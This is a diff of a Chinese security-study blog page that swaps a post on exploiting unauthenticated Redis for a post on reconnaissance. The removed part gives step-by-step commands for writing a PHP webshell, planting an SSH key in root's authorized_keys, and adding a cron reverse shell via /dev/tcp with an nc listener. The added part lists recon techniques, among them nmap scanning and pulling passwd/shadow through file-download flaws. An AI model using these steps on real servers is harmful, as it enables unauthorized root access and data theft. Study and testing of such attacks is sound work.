@@ -18,11 +18,11 @@
     <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
     <title>
         
-        redis未授权漏洞｜undefined
+        信息搜集｜undefined
         
     </title>
 
-    <link rel="canonical" href="https://pengpengp.github.io/2019/02/18/redis未授权漏洞/">
+    <link rel="canonical" href="https://pengpengp.github.io/2019/02/24/信息搜集/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -136,17 +136,17 @@
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
                 <div class="post-heading">
-                    <h1>redis未授权漏洞</h1>
+                    <h1>信息搜集</h1>
                     
                     <span class="meta">
                          作者 pengpengp
                         <span>
-                          日期 2019-02-18
+                          日期 2019-02-24
                          </span>
                     </span>
                     <div class="tags text-center">
                         
-                        <a class="tag" href="/tags/#redis漏洞(一般内网）" title="redis漏洞(一般内网）">redis漏洞(一般内网）</a>
+                        <a class="tag" href="/tags/#information collect" title="information collect">information collect</a>
                         
                     </div>
                 </div>
@@ -155,7 +155,7 @@
     </div>
     <div class="post-title-haojen">
         <span>
-            redis未授权漏洞
+            信息搜集
         </span>
     </div>
 </header>
@@ -166,72 +166,101 @@
         <div class="row">
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
-                <h3 id="原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件"><a href="#原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件" class="headerlink" title="原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件"></a>原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件</h3><h3 id="利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等"><a href="#利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等" class="headerlink" title="利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等"></a>利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等</h3><h3 id="防御：限制redis权限"><a href="#防御：限制redis权限" class="headerlink" title="防御：限制redis权限"></a>防御：限制redis权限</h3><h1 id="一。-数据库原理：redis数据库-临时存储数据库"><a href="#一。-数据库原理：redis数据库-临时存储数据库" class="headerlink" title="一。 数据库原理：redis数据库(临时存储数据库)"></a>一。 数据库原理：redis数据库(临时存储数据库)</h1><pre><code>下载redis文件
-
-解压，`make --&gt;cd src make--&gt; install`
-
-启动:`redis-server`
-
-进入：令开个连接:`redis-cli`
-</code></pre><ul>
-<li><p>redis特点：数据在文件中存储  ,默认root权限(低权限时会无权限写日志导致启动失败)，6379端口无密码</p>
-</li>
-<li><p>利用redis数据库创建任意文件方法：</p>
-<pre><code>1.设置数据库文件存储路径：    `config set dir ./`
-</code></pre><p>​        2.设置数据库文件名称:<code>config set dbfilename zs</code></p>
-<p>​        3.设置键和值：<code>set name &quot;zs&quot;</code></p>
-<p>​        4.保存：<code>save</code></p>
-<p>​        5.在目录下就有一个zs文件     </p>
-</li>
-<li><p>实验：利用redis漏洞做webshell</p>
-<p>步骤：        </p>
-<p>​        1.<code>config set dir /var/www/html/</code><br>​        2.<code>config set dbfilename 404.php</code><br>​        3.<code>set name &quot;&lt;?php phpinfo()?&gt;&quot;</code><br>​        4.<code>save</code><br>​        5.在浏览器访问ip/404.php即可执行phpinfo 命令</p>
-</li>
-<li><p>常用命令：</p>
-<pre><code>info查看信息
-get/set
-    FLUSHALL：清空键值
-    get 键：获取值
-    config get dir：获取路径
-    config get dbfilename：获取文件名
-</code></pre><hr>
+                <p>只要能挖掘到对黑客有用的信息,就是信息泄露</p>
+<h2 id="目标：只要能挖掘到对黑客有用的信息-就是信息泄露"><a href="#目标：只要能挖掘到对黑客有用的信息-就是信息泄露" class="headerlink" title="目标：只要能挖掘到对黑客有用的信息,就是信息泄露"></a>目标：只要能挖掘到对黑客有用的信息,就是信息泄露</h2><h3 id="需要搜集的信息-分类-web安全方向"><a href="#需要搜集的信息-分类-web安全方向" class="headerlink" title="*****需要搜集的信息:    分类(web安全方向)"></a><code>*****</code>需要搜集的信息:    分类(web安全方向)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.web服务器信息(中间件)</span><br><span class="line">2.web应用信息(web脚本,数据库类型,cms)</span><br><span class="line">3.服务器操作系统信息(系统版本)</span><br><span class="line">4.服务器其他信息(服务,端口)</span><br><span class="line">5.域名信息(子域名,ip)</span><br><span class="line">6.相关人员信息(注册域名相关人员)</span><br></pre></td></tr></table></figure>
 <hr>
-</li>
-</ul>
-<h1 id="二。redis利用未授权漏洞ssh免密码登陆："><a href="#二。redis利用未授权漏洞ssh免密码登陆：" class="headerlink" title="二。redis利用未授权漏洞ssh免密码登陆："></a>二。redis利用未授权漏洞ssh免密码登陆：</h1><p>​                1.cat authorized_keys：秘钥内容<br>​                    2.FlUSHALL<br>​                    3.config set dir /root/.ssh<br>​                    4.config set dbfilename authorized_keys<br>​                    5.set sshkey “\n\n\n内容\n\n\n”        //换行符保证字符串分隔开<br>​                    6.save<br>​<br>​    条件：/etc/ssh/sshd_config |grep key –&gt;pubkeyAuthentication_keys 开启，即需要ssh先免密钥登陆一次</p>
+<hr>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="*****步骤:"></a><code>*****</code>步骤:</h3><h4 id="一-搜集域名-顶级域名-子域名"><a href="#一-搜集域名-顶级域名-子域名" class="headerlink" title="一.搜集域名(顶级域名,子域名)"></a>一.搜集域名(顶级域名,子域名)</h4><p><a href="https://baidu.com" target="_blank" rel="noopener">https://baidu.com</a>          顶级子域名</p>
+<p><a href="https://www.baidu.com" target="_blank" rel="noopener">https://www.baidu.com</a>       二级子域名<br>    <a href="https://baike.baidu.com" target="_blank" rel="noopener">https://baike.baidu.com</a></p>
+<p><a href="https://a.b.baidu.com" target="_blank" rel="noopener">https://a.b.baidu.com</a>       三级子域名    </p>
+<p>http:/asdasd.com.cn         顶级域名<br>    <a href="http://beijing.gov.cn" target="_blank" rel="noopener">http://beijing.gov.cn</a>       顶级域名</p>
 <ul>
-<li>流程：找到开放的6379端口：    <pre><code>1.redis-cli -h ip 连接远程服务器redis
-2.执行info能否成功
-3.用config set dir /root看看是不是root权限
-4.config set dir /root/.ssh
-5.config set dbfilename authorized_keys
-6.set sshkey &quot;\n\n\n公钥\n\n\n&quot;
-7.save
-</code></pre></li>
+<li>搜索方式:工具(layer,sublist3r,wydomain),谷歌(site:域名),网站(site.ip138.com)/(dnsdb.io),http证书,备案信息(icp.chinaz.com)</li>
 </ul>
-<p>  ​    连接：把私钥保存成文件<br>  ​        ssh -i 私钥文件  <a href="mailto:root@192.168.11.84" target="_blank" rel="noopener">root@192.168.11.84</a></p>
+<blockquote>
+<p>技巧1:在tool.chinaz.com的备案号查看所有顶级域名</p>
+<p>技巧2.:域名+crossdomain.xml也可以查看其他子域名</p>
+<p>技巧3:利用同源策略,通过子域名绕过当前无法突破的域名</p>
+</blockquote>
+<h4 id="二-搜集相关注册人"><a href="#二-搜集相关注册人" class="headerlink" title="二.搜集相关注册人"></a>二.搜集相关注册人</h4><p>1.通过搜集网站seo.chinaz.com–&gt;</p>
+<p>2.通过浏览器插件portal查看***</p>
+<p>3.whois反查</p>
+<h4 id="三-搜集服务器信息"><a href="#三-搜集服务器信息" class="headerlink" title="三.搜集服务器信息"></a>三.搜集服务器信息</h4><p>1.判断操作系统</p>
+<p>–&gt;通过开放的端口和服务(后台一直扫着就可以,同时往下进行)<br>    windows:</p>
+<blockquote>
+<p>iis 80<br>        rpc 135<br>        smb 445<br>       rdp 3389</p>
+</blockquote>
+<p>linux:</p>
+<blockquote>
+<p>ssh 22<br>        NETBIOS 137 138 139</p>
+</blockquote>
+<ul>
+<li><p>通过大小写  <code>http://test.com/test.php</code></p>
+<pre><code>`http://test.com/TEST.php`
+</code></pre></li>
+<li><p>通过nmap -O ip查看系统信息</p>
+</li>
+</ul>
+<p>2.脚本语言</p>
+<ul>
+<li><p>识别伪静态</p>
+</li>
+<li><p>类似:<code>http://test.com/index/id/49</code></p>
+</li>
+</ul>
+<p>3.web中间件</p>
+<ul>
+<li><p>nmap -A选项</p>
+</li>
+<li><p>burp抓包查看response的server头</p>
+</li>
+</ul>
+<p>4.搜集cms信息</p>
+<p>(1).查看首页源代码<br>    (2).访问wp-login.php文件<br>    (3).discuz(论坛)平台特性:包含forum.php文件<br>    (4).robots.txt文件<br>    (5).网页底部的版权信息(copyright)</p>
+<p>工具-&gt;whatweb  (ruby写的)</p>
+<p>5.搜集服务器开放的端口及服务</p>
+<p>工具-&gt;：</p>
+<ul>
+<li><p>nmap</p>
+</li>
+<li><p>masscan</p>
+</li>
+<li><p>x-scan</p>
+</li>
+</ul>
 <hr>
 <hr>
-<h1 id="三。计划任务漏洞："><a href="#三。计划任务漏洞：" class="headerlink" title="三。计划任务漏洞："></a>三。计划任务漏洞：</h1><p>​    计划任务：<br>​            crontab -l 查看计划任务ss<br>​            <code>* * * * * echo &#39;date\nhello!&#39;&gt;&gt;/tmp/email`</code></p>
-<p>​        <code></code><em> </em> <em> </em> <em><code>代表分时日月周
-​        例子 :</code></em> 8 <em>/1 </em> * 命令`：每天八点执行命令<br>​                添加任务：crontab -e进入编辑模式,</p>
-<p>​            查看添加的任务：cat   /vat/spool/cron/root  //root是指用户    //小技巧：tail -f 文件   滚动刷新</p>
-<p>​            </p>
-<p><strong>练习：每分钟反弹shell到我的电脑*</strong><br>        1.用redis进行登陆：redis-cli -h ip<br>        2.<code>info</code>查看能否执行<br>        3.用<code>config set dir /root</code>看看是不是root权限<br>        4.<code>config set dir /var/spool/cron/</code><br>        5.<code>config set dbfilename root</code><br>        6.<code>set name    &quot;\n*/1 * * * *     bash -i &gt;&amp; /dev/tcp/IP地址/监听端口 0&gt;&amp;1\n&quot;</code><br>        7.<code>save</code><br>        8.本地nc中 <code>nc -lnvp40000</code> 开始监听</p>
-<p>遇到windows+redis的情况：<a href="https://www.anquanke.com/post/id/170360" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170360</a></p>
+<h4 id="四-可能存在的信息泄露"><a href="#四-可能存在的信息泄露" class="headerlink" title="四.可能存在的信息泄露"></a>四.可能存在的信息泄露</h4><p>1.github信息泄露</p>
+<ul>
+<li><p>管理员的博客会包含一些自己网站的信     </p>
+</li>
+<li><p>如:运维脚本\源代码\配置文件</p>
+</li>
+</ul>
+<p>2.目录遍历</p>
+<ul>
+<li>如:127.0.0.1/admin/目录能正常打开</li>
+</ul>
+<p>3.任意文件下载</p>
+<ul>
+<li><p>针对有下载功能的页面,尝试下载重要文件</p>
+</li>
+<li><p>分系统—windows\linux           </p>
+</li>
+<li><p>分权限</p>
+</li>
+<li><p>分重要文件—passwd\shadow\history\</p>
+</li>
+</ul>
 
                 <hr>
                 
 
                 <ul class="pager">
                     
-                    <li class="previous">
-                        <a href="/2019/02/24/信息搜集/" data-toggle="tooltip" data-placement="top" title="信息搜集">&larr; Previous Post</a>
-                    </li>
-                    
                     
                     <li class="next">
-                        <a href="/2019/02/17/文件包含/" data-toggle="tooltip" data-placement="top" title="文件包含">Next Post &rarr;</a>
+                        <a href="/2019/02/18/redis未授权漏洞/" data-toggle="tooltip" data-placement="top" title="redis未授权漏洞">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
@@ -250,8 +279,8 @@ get/set
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件"><span class="toc-text">原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等"><span class="toc-text">利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御：限制redis权限"><span class="toc-text">防御：限制redis权限</span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#一。-数据库原理：redis数据库-临时存储数据库"><span class="toc-text">一。 数据库原理：redis数据库(临时存储数据库)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#二。redis利用未授权漏洞ssh免密码登陆："><span class="toc-text">二。redis利用未授权漏洞ssh免密码登陆：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#三。计划任务漏洞："><span class="toc-text">三。计划任务漏洞：</span></a>
-                </li></div>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#目标：只要能挖掘到对黑客有用的信息-就是信息泄露"><span class="toc-text">目标：只要能挖掘到对黑客有用的信息,就是信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#需要搜集的信息-分类-web安全方向"><span class="toc-text">*****需要搜集的信息:    分类(web安全方向)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#步骤"><span class="toc-text">*****步骤:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#一-搜集域名-顶级域名-子域名"><span class="toc-text">一.搜集域名(顶级域名,子域名)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#二-搜集相关注册人"><span class="toc-text">二.搜集相关注册人</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#三-搜集服务器信息"><span class="toc-text">三.搜集服务器信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#四-可能存在的信息泄露"><span class="toc-text">四.可能存在的信息泄露</span></a></li></ol></li></ol></li></ol>
+                </div>
             </div>
         </div>
 
